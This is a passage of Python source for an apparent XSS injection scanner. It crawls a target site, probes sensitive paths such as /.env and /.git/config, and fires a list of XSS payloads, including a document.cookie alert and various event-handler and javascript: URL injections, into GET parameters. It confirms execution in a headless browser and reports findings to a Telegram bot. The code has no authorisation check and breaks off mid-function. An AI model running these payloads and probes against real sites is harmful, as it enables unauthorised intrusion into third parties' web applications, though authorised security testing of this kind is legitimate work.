import sys
import re
import time
import urllib.parse
from playwright.sync_api import sync_playwright
from urllib.parse import urljoin, urlparse, parse_qs, urlencode
from concurrent.futures import ThreadPoolExecutor, as_completed
from collections import deque
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

TELEGRAM_BOT_TOKEN = ""
TELEGRAM_CHAT_ID = ""

COLORS = {
    "GET": "\033[92m", "POST": "\033[94m", "PUT": "\033[93m", "DELETE": "\033[91m",
    "OTHER": "\033[95m", "CYAN": "\033[96m", "GRAY": "\033[90m", "YELLOW": "\033[93m",
    "RED": "\033[91m", "GREEN": "\033[92m", "BLUE": "\033[94m", "MAGENTA": "\033[95m",
    "RESET": "\033[0m", "BOLD": "\033[1m", "DIM": "\033[2m",
}

CANARY = "XSS_CANARY_9f3a2b"

PATH_PATTERN = r"[\"']\/(?:[a-zA-Z0-9\-_./]+)[\"']"
PATH_RE = re.compile(PATH_PATTERN)

EXT_REGEX_STR = r"(?:js|json|php|html?|asp|aspx|jsp|do|action|xml|txt|map)"

TARGET_EXTENSIONS = ('.js', '.json', '.php', '.html', '.htm', '.asp', '.aspx', '.jsp')

COMMON_PATHS = [
    "/admin", "/admin/login", "/administrator", "/dashboard",
    "/api", "/api/v1", "/api/v2", "/api/users", "/api/login",
    "/login", "/signin", "/register", "/signup", "/logout",
    "/profile", "/account", "/settings", "/user", "/users",
    "/search", "/upload", "/download", "/file", "/files",
    "/redirect", "/url", "/link", "/callback", "/return",
    "/debug", "/test", "/dev", "/staging", "/backup",
    "/.git/config", "/.env", "/config", "/wp-admin",
    "/robots.txt", "/sitemap.xml", "/sitemap_index.xml",
    "/index.php?id=1", "/page?id=1", "/product?id=1",
    "/category?name=test", "/item?name=test", "/view?page=1",
]

CRITICAL_XSS_PAYLOADS = [
    (f"<script>alert('{CANARY}')</script>", "Script Alert"),
    (f"<ScRiPt>alert('{CANARY}')</ScRiPt>", "Case Insensitive"),
    (f"<script>alert(document.domain)</script>", "Domain Alert"),
    (f"<script>alert(document.cookie)</script>", "Cookie Alert"),
    (f"<img src=x onerror=alert('{CANARY}')>", "Image Error"),
    (f"<img src='x' onerror='alert(\"{CANARY}\")'>", "Image Error 2"),
    (f"<img src=x onerror=prompt('{CANARY}')>", "Image Prompt"),
    (f"<img src=x onerror=confirm('{CANARY}')>", "Image Confirm"),
    (f"<svg/onload=alert('{CANARY}')>", "SVG Onload"),
    (f"<svg><script>alert('{CANARY}')</script></svg>", "SVG Script"),
    (f"<svg><animate onbegin=alert('{CANARY}')>", "SVG Animate"),
    (f"<body onload=alert('{CANARY}')>", "Body Onload"),
    (f"<input onfocus=alert('{CANARY}') autofocus>", "Input Autofocus"),
    (f"<iframe src=javascript:alert('{CANARY}')>", "Iframe JS"),
    (f"<iframe srcdoc='<script>alert(\"{CANARY}\")</script>'>", "Iframe Srcdoc"),
    (f"<a href=javascript:alert('{CANARY}')>click</a>", "Link JS"),
    (f"<form><button formaction=javascript:alert('{CANARY}')>", "Form Button"),
    (f"<details open ontoggle=alert('{CANARY}')>", "Details Ontoggle"),
    (f"<object data=javascript:alert('{CANARY}')>", "Object Data"),
    (f"<embed src=javascript:alert('{CANARY}')>", "Embed JS"),
    (f"<div onclick=alert('{CANARY}')>Click</div>", "Div Click"),
    (f"<b onmouseover=alert('{CANARY}')>test</b>", "Mouseover"),
    (f"<textarea onfocus=alert('{CANARY}')>", "Textarea Focus"),
    ("%3Cscript%3Ealert(1)%3C%2Fscript%3E", "URL Encoded Script"),
    ("&#60;script&#62;alert(1)&#60;/script&#62;", "HTML Entity Script"),
    ("<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>", "CharCode Eval"),
]

XSS_PATTERNS = [
    r"<script>.*?alert\s*\(.*?\).*?</script>",
    r"<script>.*?prompt\s*\(.*?\).*?</script>",
    r"<script>.*?confirm\s*\(.*?\).*?</script>",
    r"<script>.*?document\.cookie.*?</script>",
    r"<script>.*?document\.domain.*?</script>",
    r"<img[^>]+onerror\s*=\s*['\"]?\s*alert\s*\(.*?\)\s*['\"]?",
    r"<img[^>]+onerror\s*=\s*['\"]?\s*prompt\s*\(.*?\)\s*['\"]?",
    r"<img[^>]+onerror\s*=\s*['\"]?\s*confirm\s*\(.*?\)\s*['\"]?",
    r"<svg[^>]*onload\s*=\s*['\"]?\s*alert\s*\(.*?\)\s*['\"]?",
    r"<svg[^>]*onload\s*=\s*['\"]?\s*prompt\s*\(.*?\)\s*['\"]?",
    r"<body[^>]*onload\s*=\s*['\"]?\s*alert\s*\(.*?\)\s*['\"]?",
    r"<iframe[^>]*src\s*=\s*['\"]?javascript:\s*alert\s*\(.*?\)\s*['\"]?",
    r"<a[^>]*href\s*=\s*['\"]?javascript:\s*alert\s*\(.*?\)\s*['\"]?",
    r"javascript:\s*alert\s*\(.*?\)",
    r"javascript:\s*prompt\s*\(.*?\)",
    r"javascript:\s*confirm\s*\(.*?\)",
    r"<details[^>]*ontoggle\s*=\s*['\"]?\s*alert\s*\(.*?\)\s*['\"]?",
    r"<object[^>]*data\s*=\s*['\"]?javascript:\s*alert\s*\(.*?\)\s*['\"]?",
    r"<embed[^>]*src\s*=\s*['\"]?javascript:\s*alert\s*\(.*?\)\s*['\"]?",
    r"onerror\s*=\s*['\"]?\s*alert\s*\(.*?\)\s*['\"]?",
    r"onload\s*=\s*['\"]?\s*alert\s*\(.*?\)\s*['\"]?",
    r"onclick\s*=\s*['\"]?\s*alert\s*\(.*?\)\s*['\"]?",
    r"onmouseover\s*=\s*['\"]?\s*alert\s*\(.*?\)\s*['\"]?",
    r"onfocus\s*=\s*['\"]?\s*alert\s*\(.*?\)\s*['\"]?",
    r"ontoggle\s*=\s*['\"]?\s*alert\s*\(.*?\)\s*['\"]?",
    r"onstart\s*=\s*['\"]?\s*alert\s*\(.*?\)\s*['\"]?",
]

IGNORE_PATTERNS = [
    r"404 Not Found", r"403 Forbidden", r"401 Unauthorized",
    r"500 Internal Server Error", r"Page not found", r"Invalid input",
    r"Validation error", r"CSRF token", r"csrf", r"token mismatch",
    r"invalid token", r"rate limit", r"too many requests", r"captcha",
    r"reCAPTCHA", r"hCaptcha", r"Turnstile", r"Cloudflare",
    r"Access Denied", r"Permission denied", r"Unauthorized", r"Forbidden",
]


class XSSInjectionCrawler:
    def __init__(self):
        self.discovered_urls = set()
        self.vulnerable_found = []
        self.all_forms = []
        self.all_get_params = []
        self.base_url = ""
        self.total_tests = 0
        self.vulnerable_tests = 0
        self.visited_urls = set()
        self.max_pages = 20
        self.detected_vulnerabilities = set()
        self.fast_mode = True
        self.tested_endpoints = set()
        self.confirmed_vulns = []
        self.js_files_visited = set()
        self.failed_verification = {}
        self.scan_start_time = None
        self.max_scan_seconds = 1800
        self.requests_session = requests.Session()
        self.requests_session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
        })

    def escape_html(self, text):
        if not text:
            return ""
        return str(text).replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")

    def is_time_up(self):
        if self.scan_start_time is None:
            return False
        return (time.time() - self.scan_start_time) > self.max_scan_seconds

    def print_banner(self):
        banner = f"""
{COLORS['BOLD']}{COLORS['RED']}                 ██╗  ██╗    ███████╗    ███████╗   {COLORS['RESET']}
{COLORS['BOLD']}{COLORS['RED']}                 ╚██╗██╔╝    ██╔════╝    ██╔════╝   {COLORS['RESET']}
{COLORS['BOLD']}{COLORS['RED']}                  ╚███╔╝     ███████╗    ███████╗   {COLORS['RESET']}
{COLORS['BOLD']}{COLORS['RED']}                  ██╔██╗     ╚════██║    ╚════██║   {COLORS['RESET']}
{COLORS['BOLD']}{COLORS['RED']}                 ██╔╝╚██╗    ███████║    ███████║   {COLORS['RESET']}
{COLORS['BOLD']}{COLORS['RED']}                 ╚═╝  ╚═╝    ╚══════╝    ╚══════╝   {COLORS['RESET']}
{COLORS['BOLD']}{COLORS['YELLOW']}                 ✦ XSS INJECTION SCANNER v2.0 ✦{COLORS['RESET']}"""
        print(banner)

    def print_menu(self):
        print(
            f"\n{COLORS['CYAN']}┌─────────────────────────────────────────────────────────────────────────┐{COLORS['RESET']}")
        print(
            f"{COLORS['CYAN']}│{COLORS['RESET']}  {COLORS['BOLD']}📋 SCAN OPTIONS{COLORS['RESET']}                                                        {COLORS['CYAN']}│{COLORS['RESET']}")
        print(
            f"{COLORS['CYAN']}├─────────────────────────────────────────────────────────────────────────┤{COLORS['RESET']}")
        print(
            f"{COLORS['CYAN']}│{COLORS['RESET']}  {COLORS['GREEN']}[1]{COLORS['RESET']}  Quick Scan (Default)                                              {COLORS['CYAN']}│{COLORS['RESET']}")
        print(
            f"{COLORS['CYAN']}│{COLORS['RESET']}  {COLORS['YELLOW']}[2]{COLORS['RESET']}  Deep Scan (More Pages & Payloads + Advanced Discovery)            {COLORS['CYAN']}│{COLORS['RESET']}")
        print(
            f"{COLORS['CYAN']}│{COLORS['RESET']}  {COLORS['RED']}[3]{COLORS['RESET']}  Exit                                                              {COLORS['CYAN']}│{COLORS['RESET']}")
        print(
            f"{COLORS['CYAN']}└─────────────────────────────────────────────────────────────────────────┘{COLORS['RESET']}")

    def is_encoded(self, response_text, payload):
        if not response_text:
            return True
        if payload not in response_text:
            encoded_variants = [
                payload.replace("<", "&lt;").replace(">", "&gt;"),
                payload.replace("<", "&#60;").replace(">", "&#62;"),
                payload.replace("<", "&#x3C;").replace(">", "&#x3E;"),
                urllib.parse.quote(payload, safe=""),
            ]
            for variant in encoded_variants:
                if variant and variant in response_text:
                    return True
            return False
        return False

    def is_in_comment(self, response_text, payload):
        idx = response_text.find(payload)
        if idx == -1:
            return False
        before = response_text[max(0, idx - 200):idx]
        comment_open = before.rfind("<!--")
        comment_close = before.rfind("-->")
        if comment_open != -1 and (comment_close == -1 or comment_open > comment_close):
            return True
        return False

    def is_in_textarea(self, response_text, payload):
        idx = response_text.find(payload)
        if idx == -1:
            return False
        before = response_text[max(0, idx - 500):idx].lower()
        ta_open = before.rfind("<textarea")
        ta_close = before.rfind("</textarea")
        if ta_open != -1 and (ta_close == -1 or ta_open > ta_close):
            return True
        return False

    def analyze_context(self, response_text, payload):
        if not response_text:
            return "unknown", 0
        if payload not in response_text:
            return "not_reflected", 0
        if self.is_encoded(response_text, payload):
            return "encoded_safe", 0
        if self.is_in_comment(response_text, payload):
            return "html_comment_safe", 0
        if self.is_in_textarea(response_text, payload):
            return "textarea_safe", 0
        idx = response_text.find(payload)
        before = response_text[max(0, idx - 100):idx]
        after = response_text[idx + len(payload):idx + len(payload) + 100]
        context_lower = (before + after).lower()
        if "<script" in context_lower:
            return "inside_script_tag", 100
        if "on" in before[-20:].lower() and "=" in before[-15:]:
            return "inside_event_handler", 95
        if "href" in before[-30:].lower() or "src" in before[-30:].lower():
            return "inside_attribute_url", 90
        return "raw_reflection", 85

    def confirm_execution(self, url, payload, context, method="GET", data=None):
        dialog_triggered = {"hit": False, "message": ""}
        try:
            verify_page = context.new_page()

            def on_dialog(dialog):
                try:
                    msg = dialog.message or ""
                    if CANARY in msg or "1" in msg or payload in msg:
                        dialog_triggered["hit"] = True
                        dialog_triggered["message"] = msg
                    dialog.dismiss()
                except Exception:
                    try:
                        dialog.dismiss()
                    except Exception:
                        pass

            verify_page.on("dialog", on_dialog)

            try:
                if method == "POST" and data:
                    verify_page.goto(url, timeout=8000, wait_until="commit")
                    verify_page.evaluate(
                        """
                        (args) => {
                            const form = document.createElement('form');
                            form.method = 'POST';
                            form.action = args.url;
                            const params = new URLSearchParams(args.data);
                            for (const [k, v] of params.entries()) {
                                const input = document.createElement('input');
                                input.type = 'hidden';
                                input.name = k;
                                input.value = v;
                                form.appendChild(input);
                            }
                            document.body.appendChild(form);
                            form.submit();
                        }
                        """,
                        {"url": url, "data": data},
                    )
                    try:
                        verify_page.wait_for_load_state("commit", timeout=6000)
                    except Exception:
                        pass
                else:
                    verify_page.goto(url, timeout=8000, wait_until="commit")

                verify_page.wait_for_timeout(800)

                try:
                    marker = verify_page.evaluate("() => window.__xss_marker__ || null")
                    if marker == CANARY:
                        dialog_triggered["hit"] = True
                        dialog_triggered["message"] = "window marker set"
                except Exception:
                    pass

            except Exception:
                pass
            finally:
                try:
                    verify_page.close(timeout=2000)
                except Exception:
                    pass

        except Exception:
            pass

        return dialog_triggered["hit"], dialog_triggered["message"]

    def detect_xss_fast(self, response_text, payload):
        if not response_text:
            return False, "No response", 0
        for pattern in IGNORE_PATTERNS:
            if re.search(pattern, response_text, re.IGNORECASE):
                return False, "Ignored", 0
        if self.is_encoded(response_text, payload):
            return False, "Encoded (safe)", 0
        if self.is_in_comment(response_text, payload):
            return False, "HTML comment (safe)", 0
        if self.is_in_textarea(response_text, payload):
            return False, "Textarea (safe)", 0
        ctx_type, ctx_score = self.analyze_context(response_text, payload)
        if ctx_score == 0:
            return False, "No XSS", 0
        clean_payload = re.sub(r'<[^>]+>', '', payload)
        if len(clean_payload) > 3 and clean_payload in response_text:
            return True, f"Payload in {ctx_type}", ctx_score
        for pattern in XSS_PATTERNS:
            if re.search(pattern, response_text, re.IGNORECASE):
                return True, f"XSS pattern in {ctx_type}", ctx_score
        return False, "No XSS", 0

    def analyze_response(self, original_response, test_response, payload):
        if not original_response or not test_response:
            return False, "No response"
        if original_response == test_response:
            return False, "No change"
        is_xss, reason, confidence = self.detect_xss_fast(test_response, payload)
        if is_xss:
            return True, f"{reason} (Confidence: {confidence}%)"
        if abs(len(original_response) - len(test_response)) > 100:
            indicators = ['script', 'onerror', 'onload', 'alert', 'prompt', 'confirm', 'javascript']
            if any(i in test_response.lower() for i in indicators):
                return True, "Response change with XSS indicators"
        return False, "No XSS"

    def get_all_links_fast(self, page):
        links = set()
        try:
            hrefs = page.evaluate("""
                () => {
                    const links = document.querySelectorAll('a[href]');
                    return Array.from(links).map(a => a.href);
                }
            """)
            for href in hrefs:
                if href and not href.startswith(('#', 'javascript:', 'mailto:', 'tel:')):
                    if self.is_same_domain(href):
                        links.add(href)
        except Exception:
            pass
        return links

    def get_all_forms_fast(self, page):
        forms = []
        try:
            forms_data = page.evaluate("""
                () => {
                    const forms = document.querySelectorAll('form');
                    return Array.from(forms).map(form => {
                        const inputs = form.querySelectorAll('input:not([type="hidden"]):not([type="submit"]):not([type="button"])');
                        const textareas = form.querySelectorAll('textarea');
                        return {
                            action: form.action || '',
                            method: form.method || 'get',
                            inputs: Array.from(inputs).map(inp => ({name: inp.name || '', type: inp.type || 'text'})),
                            textareas: Array.from(textareas).map(ta => ({name: ta.name || '', type: 'textarea'}))
                        };
                    });
                }
            """)
            for form_data in forms_data:
                inputs = form_data.get('inputs', []) + form_data.get('textareas', [])
                if inputs:
                    forms.append({
                        'url': form_data.get('action') or page.url,
                        'method': form_data.get('method', 'get').upper(),
                        'action': form_data.get('action', ''),
                        'inputs': inputs
                    })
        except Exception:
            pass
        return forms

    def extract_get_params_fast(self, url):
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        if params:
            return {
                'url': url,
                'base_url': f"{parsed.scheme}://{parsed.netloc}{parsed.path}",
                'params': params
            }
        return None

    def is_same_domain(self, url):
        try:
            parsed_base = urlparse(self.base_url)
            parsed_url = urlparse(url)
            return parsed_base.netloc == parsed_url.netloc
        except Exception:
            return False

    def get_endpoint_key(self, url, params=None):
        parsed = urlparse(url)
        base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        if params:
            sorted_params = sorted(params.keys())
            return f"{base}?{'&'.join(sorted_params)}"
        return base

    def extract_links_from_js(self, page):
        links = set()
        try:
            js_urls = page.evaluate("""
                () => {
                    const urls = new Set();
                    performance.getEntriesByType('resource').forEach(r => urls.add(r.name));
                    document.querySelectorAll('script:not([src])').forEach(s => {
                        const matches = s.textContent.match(/["'](\\/[a-zA-Z0-9_\\-\\/\\?=&\\.]+)["']/g) || [];
                        matches.forEach(m => urls.add(m.replace(/["']/g, '')));
                    });
                    document.querySelectorAll('script[src]').forEach(s => urls.add(s.src));
                    document.querySelectorAll('link[href], meta[content]').forEach(el => {
                        const v = el.href || el.content;
                        if (v && v.startsWith('http')) urls.add(v);
                    });
                    return Array.from(urls);
                }
            """)
            for u in js_urls:
                if u and self.is_same_domain(u) and not u.startswith(('#', 'javascript:', 'mailto:')):
                    links.add(u)
        except Exception:
            pass
        return links

    def parse_robots_sitemap(self):
        discovered = set()
        parsed = urlparse(self.base_url)
        base = f"{parsed.scheme}://{parsed.netloc}"

        try:
            r = self.requests_session.get(f"{base}/robots.txt", timeout=8, verify=False)
            if r.status_code == 200:
                for line in r.text.splitlines():
                    if line.lower().startswith(("disallow:", "allow:", "sitemap:")):
                        path = line.split(":", 1)[1].strip()
                        if path.startswith("/"):
                            discovered.add(f"{base}{path}")
                        elif path.startswith("http") and self.is_same_domain(path):
                            discovered.add(path)
        except Exception:
            pass

        for sm_path in ["/sitemap.xml", "/sitemap_index.xml", "/sitemap-index.xml"]:
            try:
                r = self.requests_session.get(f"{base}{sm_path}", timeout=8, verify=False)
                if r.status_code == 200 and "<loc>" in r.text:
                    for loc in re.findall(r"<loc>\s*(.*?)\s*</loc>", r.text):
                        if self.is_same_domain(loc):
                            discovered.add(loc)
            except Exception:
                pass

        return discovered

    def probe_common_paths(self):
        discovered = set()
        parsed = urlparse(self.base_url)
        base = f"{parsed.scheme}://{parsed.netloc}"

        def check_one(path):
            url = f"{base}{path}"
            try:
                r = self.requests_session.head(url, timeout=5, allow_redirects=True, verify=False)
                if r.status_code in (400, 403, 405, 501):
                    r = self.requests_session.get(url, timeout=5, allow_redirects=True, stream=True, verify=False)
                    r.close()
                if r.status_code in (200, 301, 302, 401, 403):
                    return url
            except Exception:
                pass
            return None

        with ThreadPoolExecutor(max_workers=15) as executor:
            results = executor.map(check_one, COMMON_PATHS)
            for r in results:
                if r:
                    discovered.add(r)
        return discovered

    def extract_file_refs(self, text, base_url):
        refs = set()
        for m in re.finditer(rf"[\"']([a-zA-Z0-9\-_./]+\.{EXT_REGEX_STR})[\"']", text, re.IGNORECASE):
            refs.add(urljoin(base_url, m.group(1)))
        return refs

    def crawl_bfs(self, seeds, max_depth=2, max_files=300, batch=15):
        seen = set(seeds)
        queue = deque((s, 0) for s in seeds)
        results = set(seeds)

        def fetch_text(u):
            try:
                r = self.requests_session.get(u, timeout=6, verify=False)
                if r.status_code == 200 and 'text' in r.headers.get('Content-Type', '').lower():
                    return r.text
            except Exception:
                pass
            return None

        while queue and len(results) < max_files:
            level = []
            while queue and len(level) < batch:
                url, depth = queue.popleft()
                if depth < max_depth:
                    level.append((url, depth))
            if not level:
                break

            with ThreadPoolExecutor(max_workers=min(batch, 10)) as ex:
                futures = {ex.submit(fetch_text, u): (u, d) for u, d in level}
                for fut in as_completed(futures):
                    url, depth = futures[fut]
                    try:
                        text = fut.result()
                    except Exception:
                        text = None
                    if not text:
                        continue
                    for sub in self.extract_file_refs(text, url):
                        if sub in seen or len(results) >= max_files:
                            continue
                        if '.css' in sub.lower():
                            continue
                        if not self.is_same_domain(sub):
                            continue
                        seen.add(sub)
                        results.add(sub)
                        queue.append((sub, depth + 1))
        return list(results)

    def extract_paths_from_js_content(self, content, base_url):
        paths = set()
        for match in PATH_RE.finditer(content):
            raw_path = match.group().strip('"\'')
            if "//" in raw_path or raw_path == "/":
                continue
            full = urljoin(base_url, raw_path)
            if self.is_same_domain(full):
                paths.add(full)
        endpoints = re.findall(r'["\'](/api/[a-zA-Z0-9/_-]+)["\']', content)
        endpoints += re.findall(r'["\'](/v[0-9]+/[a-zA-Z0-9/_-]+)["\']', content)
        for ep in endpoints:
            full = urljoin(base_url, ep)
            if self.is_same_domain(full):
                paths.add(full)
        return paths

    def advanced_discovery(self, page, context):
        print(f"\n{COLORS['CYAN']}►{COLORS['RESET']} {COLORS['BOLD']}Advanced Discovery (JS/robots/sitemap/wordlist/BFS)...{COLORS['RESET']}")

        initial_count = len(self.discovered_urls)
        extra = set()

        print(f"{COLORS['GRAY']}   ↳ Extracting links from JS/resources...{COLORS['RESET']}", end=" ", flush=True)
        js_links = self.extract_links_from_js(page)
        extra |= js_links
        print(f"{COLORS['GREEN']}✓ {len(js_links)}{COLORS['RESET']}")

        print(f"{COLORS['GRAY']}   ↳ Parsing robots.txt & sitemap.xml...{COLORS['RESET']}", end=" ", flush=True)
        rs_links = self.parse_robots_sitemap()
        extra |= rs_links
        print(f"{COLORS['GREEN']}✓ {len(rs_links)}{COLORS['RESET']}")

        print(f"{COLORS['GRAY']}   ↳ Probing common paths ({len(COMMON_PATHS)})...{COLORS['RESET']}", end=" ", flush=True)
        common_links = self.probe_common_paths()
        extra |= common_links
        print(f"{COLORS['GREEN']}✓ {len(common_links)}{COLORS['RESET']}")

        print(f"{COLORS['GRAY']}   ↳ BFS crawl for JS/HTML files (depth=2)...{COLORS['RESET']}", end=" ", flush=True)
        bfs_seeds = [u for u in list(self.discovered_urls)[:10] if self.is_same_domain(u)]
        bfs_links = set(self.crawl_bfs(bfs_seeds, max_depth=2, max_files=200))
        extra |= bfs_links
        print(f"{COLORS['GREEN']}✓ {len(bfs_links)}{COLORS['RESET']}")

        print(f"{COLORS['GRAY']}   ↳ Extracting paths from JS file contents...{COLORS['RESET']}", end=" ", flush=True)
        js_content_paths = set()
        js_files_to_scan = [u for u in bfs_links if u.lower().endswith('.js')][:30]
        for js_url in js_files_to_scan:
            if js_url in self.js_files_visited:
                continue
            self.js_files_visited.add(js_url)
            try:
                r = self.requests_session.get(js_url, timeout=8, verify=False)
                if r.status_code == 200:
                    js_content_paths |= self.extract_paths_from_js_content(r.text, js_url)
            except Exception:
                pass
        extra |= js_content_paths
        print(f"{COLORS['GREEN']}✓ {len(js_content_paths)}{COLORS['RESET']}")

        for u in extra:
            if u not in self.discovered_urls and self.is_same_domain(u):
                self.discovered_urls.add(u)
                params = self.extract_get_params_fast(u)
                if params:
                    self.all_get_params.append(params)

        added = len(self.discovered_urls) - initial_count
        print(f"\n{COLORS['GREEN']}✓{COLORS['RESET']} Advanced discovery added {COLORS['YELLOW']}{added}{COLORS['RESET']} new endpoints")
        print(f"{COLORS['GREEN']}✓{COLORS['RESET']} Total discovered URLs: {COLORS['YELLOW']}{len(self.discovered_urls)}{COLORS['RESET']}")
        print(f"{COLORS['GREEN']}✓{COLORS['RESET']} Total GET parameters: {COLORS['YELLOW']}{len(self.all_get_params)}{COLORS['RESET']}")

    def discover_pages_fast(self, page, deep=False):
        print(
            f"\n{COLORS['CYAN']}►{COLORS['RESET']} {COLORS['BOLD']}Discovering pages and endpoints...{COLORS['RESET']}")
        if page.url not in self.discovered_urls:
            self.discovered_urls.add(page.url)

        if deep:
            links = self.get_all_links_fast(page)
            print(f"{COLORS['GRAY']}   ↳ Found {len(links)} unique links{COLORS['RESET']}")
            for link in links:
                if link not in self.discovered_urls:
                    self.discovered_urls.add(link)
                    params = self.extract_get_params_fast(link)
                    if params:
                        self.all_get_params.append(params)

        forms = self.get_all_forms_fast(page)
        print(f"{COLORS['GRAY']}   ↳ Found {len(forms)} forms{COLORS['RESET']}")
        self.all_forms.extend(forms)

        if not deep:
            params = self.extract_get_params_fast(page.url)
            if params:
                self.all_get_params.append(params)

        return list(self.discovered_urls)

    def crawl_pages_fast(self, context):
        print(f"\n{COLORS['CYAN']}►{COLORS['RESET']} {COLORS['BOLD']}Crawling discovered pages...{COLORS['RESET']}")
        pages_to_visit = list(self.discovered_urls)[:self.max_pages]
        total_pages = len(pages_to_visit)
        for idx, url in enumerate(pages_to_visit, 1):
            if url in self.visited_urls:
                continue
            if self.is_time_up():
                print(f"\n{COLORS['RED']}⏱ Time limit reached during crawl. Stopping.{COLORS['RESET']}")
                return
            print(f"{COLORS['GRAY']}   [{idx}/{total_pages}] Visiting: {url[:60]}...{COLORS['RESET']}", end=" ",
                  flush=True)
            try:
                page = context.new_page()
                page.goto(url, timeout=10000, wait_until="domcontentloaded")
                self.visited_urls.add(url)
                forms = self.get_all_forms_fast(page)
                if forms:
                    self.all_forms.extend(forms)
                    print(f"{COLORS['GREEN']}✓ Found {len(forms)} forms{COLORS['RESET']}")
                else:
                    print(f"{COLORS['DIM']}✓ No forms{COLORS['RESET']}")
                links = self.get_all_links_fast(page)
                for link in links:
                    if link not in self.discovered_urls:
                        self.discovered_urls.add(link)
                        params = self.extract_get_params_fast(link)
                        if params:
                            self.all_get_params.append(params)
                page.close()
            except Exception:
                print(f"{COLORS['YELLOW']}⚠ Error{COLORS['RESET']}")
                continue
        print(f"\n{COLORS['GREEN']}✓{COLORS['RESET']} Crawled {len(self.visited_urls)} pages")
        print(f"{COLORS['GREEN']}✓{COLORS['RESET']} Found {len(self.all_forms)} forms")
        print(f"{COLORS['GREEN']}✓{COLORS['RESET']} Found {len(self.all_get_params)} GET parameters")

    def get_response_fast(self, url, data=None, method='POST', context=None):
        try:
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.9',
                'Connection': 'keep-alive',
            }
            if method == 'POST':
                headers['Content-Type'] = 'application/x-www-form-urlencoded'
                response = context.request.post(url, headers=headers, data=data, timeout=8000)
            else:
                response = context.request.get(url, headers=headers, timeout=8000)
            return response.text()
        except Exception:
            return None

    def check_dom_xss(self, context, url):
        findings = []
        parsed = urlparse(url)
        if not parsed.query:
            return findings
        params = parse_qs(parsed.query)
        for param_name in list(params.keys())[:3]:
            test_url = url + f"#{CANARY}"
            dialog_hit, msg = self.confirm_execution(test_url, CANARY, context)
            if dialog_hit:
                findings.append({
                    'url': test_url,
                    'payload': f"#{CANARY}",
                    'payload_name': "DOM Fragment",
                    'parameter': param_name,
                    'reason': f"DOM XSS confirmed: {msg}",
                    'confirmed': True,
                })
        return findings

    def send_vulnerability_alert(self, vuln, scan_type):
        from datetime import datetime
        scan_label = "DEEP SCAN" if scan_type == "deep" else "QUICK SCAN"
        status = "✅ CONFIRMED" if vuln.get('confirmed') else "⚠️ SUSPECTED"
        lines = []
        lines.append(f"<b>🚨 XSS VULNERABILITY DETECTED!</b>")
        lines.append(f"━━━━━━━━━━━━━━━━━━━━")
        lines.append(f"<b>Status:</b> {status}")
        lines.append(f"<b>Target:</b> <code>{self.escape_html(self.base_url)}</code>")
        lines.append(f"<b>Mode:</b> {scan_label}")
        lines.append(f"<b>Time:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        lines.append(f"━━━━━━━━━━━━━━━━━━━━")
        lines.append(f"<b>⚠️ VULNERABLE ENDPOINT:</b>")
        lines.append(f"<code>{self.escape_html(vuln['url'])}</code>")
        if 'parameter' in vuln and vuln['parameter']:
            lines.append(f"<b>Param:</b> <code>{self.escape_html(vuln['parameter'])}</code>")
        lines.append(f"<b>Payload:</b> <code>{self.escape_html(vuln['payload'])}</code>")
        lines.append(f"<b>Type:</b> {self.escape_html(vuln.get('payload_name', 'N/A'))}")
        lines.append(f"<b>Reason:</b> {self.escape_html(vuln['reason'])}")
        lines.append(f"━━━━━━━━━━━━━━━━━━━━")
        lines.append(f"<i>Generated by XSS Injection Scanner v2.0</i>")
        lines.append(f"<a href=\"https://github.com/nn0z/\"><b>- Github</b></a>")
        return "\n".join(lines)

    def record_vulnerability(self, vuln_data, scan_type, confirmed=False):
        vuln_data['confirmed'] = confirmed
        self.vulnerable_found.append(vuln_data)
        if confirmed:
            self.confirmed_vulns.append(vuln_data)
        alert = self.send_vulnerability_alert(vuln_data, scan_type)
        self.send_to_telegram(alert)

    def test_critical_payloads(self, context, is_deep=False):
        print(
            f"\n{COLORS['CYAN']}►{COLORS['RESET']} {COLORS['BOLD']}Testing critical XSS payloads...{COLORS['RESET']}\n")
        if is_deep:
            max_params_per_endpoint = 5
            max_payloads_per_test = len(CRITICAL_XSS_PAYLOADS)
            max_endpoints = len(self.all_get_params)
        else:
            max_params_per_endpoint = 3
            max_payloads_per_test = 10
            max_endpoints = 15
        scan_type = "deep" if is_deep else "quick"
        for param_data in self.all_get_params[:max_endpoints]:
            if self.is_time_up():
                print(f"\n{COLORS['RED']}⏱ Time limit reached. Stopping payload tests.{COLORS['RESET']}")
                return
            url = param_data['url']
            base_url = param_data['base_url']
            params = param_data['params']
            endpoint_key = self.get_endpoint_key(base_url, params)
            if endpoint_key in self.tested_endpoints:
                print(f"{COLORS['DIM']}   ⏭ Skipping already tested endpoint: {base_url}{COLORS['RESET']}")
                continue
            self.tested_endpoints.add(endpoint_key)
            original_data = {}
            for key, values in params.items():
                if values:
                    original_data[key] = values[0]
            if not original_data:
                continue
            original_url = f"{base_url}?{urlencode(original_data)}"
            original_response = self.get_response_fast(original_url, method='GET', context=context)
            if not original_response:
                continue
            print(f"\n{COLORS['BLUE']}━━━ Testing: {base_url}{COLORS['RESET']}")
            params_to_test = list(original_data.keys())[:max_params_per_endpoint]
            for param_key in params_to_test:
                payloads_to_test = CRITICAL_XSS_PAYLOADS[:max_payloads_per_test] if not is_deep else CRITICAL_XSS_PAYLOADS
                for payload, payload_name in payloads_to_test:
                    if self.is_time_up():
                        print(f"\n{COLORS['RED']}⏱ Time limit reached. Stopping.{COLORS['RESET']}")
                        return
                    test_params = original_data.copy()
                    test_params[param_key] = f"{original_data[param_key]}{payload}"
                    test_url = f"{base_url}?{urlencode(test_params)}"
                    print(
